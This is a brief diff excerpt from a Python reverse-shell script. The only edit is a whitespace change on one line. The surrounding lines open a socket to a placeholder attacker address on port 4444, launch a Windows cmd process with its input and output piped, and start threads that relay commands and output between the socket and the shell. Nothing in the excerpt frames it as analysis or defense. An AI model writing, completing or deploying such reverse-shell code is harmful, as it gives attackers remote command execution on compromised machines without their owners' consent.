@@ -23,7 +23,7 @@ def p2s(s, p):
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("IP",4444))
 
-p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
 s2p_thread = threading.Thread(target=s2p, args=[s, p])
 s2p_thread.daemon = True
